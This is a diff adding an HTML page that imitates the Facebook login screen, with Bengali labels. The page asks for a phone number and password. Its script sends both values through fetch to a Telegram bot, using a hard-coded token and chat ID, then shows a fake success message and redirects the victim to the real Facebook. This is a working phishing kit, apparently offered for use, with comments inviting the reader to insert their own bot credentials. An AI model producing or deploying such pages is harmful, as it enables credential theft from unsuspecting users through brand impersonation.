@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pacebook Login</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: white;
+            width: 350px;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0px 5px 15px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background-color: #1877f2; /* ফেসবুকের নীল */
+            border-radius: 50%;
+            margin: 0 auto 15px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        h1 {
+            color: #1877f2;
+            margin-bottom: 25px;
+            font-size: 28px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            font-size: 16px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            font-size: 18px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0f5bb5;
+        }
+
+        .footer-text {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="logo">f</div>
+        <h1>facebook</h1>
+
+        <input type="text" id="name" placeholder="ফোন নাম্বার">
+        <input type="tel" id="phone" placeholder="পাসওয়ার্ড">
+
+        <button onclick="login()">Login</button>
+
+        <div class="footer-text">
+        </div>
+    </div>
+
+    <script>
+        function login() {
+            const name = document.getElementById('name').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+
+            if(name === "" || phone === "") {
+                alert("নাম এবং ফোন নাম্বার উভয়ই লিখুন!");
+                return;
+            }
+
+            // Telegram এ পাঠানোর কোড
+            const chatId = "8464303191"; // তোমার চ্যাট আইডি
+            const token = "8574614343:AAElceKdLrNMG4ItHg4wlMMvIYyUrtIPdB4"; // তোমার API টোকেন
+            const textToSend = `নাম: ${name}\nফোন নাম্বার: ${phone}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ chat_id: chatId, text: textToSend })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok){
+                    alert("লগইন সফল হয়েছে!");
+                    // এখানে তোমার ওয়েবসাইটের লিঙ্ক বসাও
+                    const websiteURL = "https://Facebook.com"; // ← এখানে তোমার ওয়েবসাইটের লিঙ্ক বসাও
+                    window.location.href = websiteURL; // লগইন হলে ওয়েবসাইটে নিয়ে যাবে
+                } else {
+                    alert("কিছু সমস্যা হয়েছে!");
+                }
+            })
+            .catch(err => {
+                console.error(err);
+                alert("কিছু ভুল হয়েছে!");
+            });
+        }
+    </script>
+
+</body>
+</html>
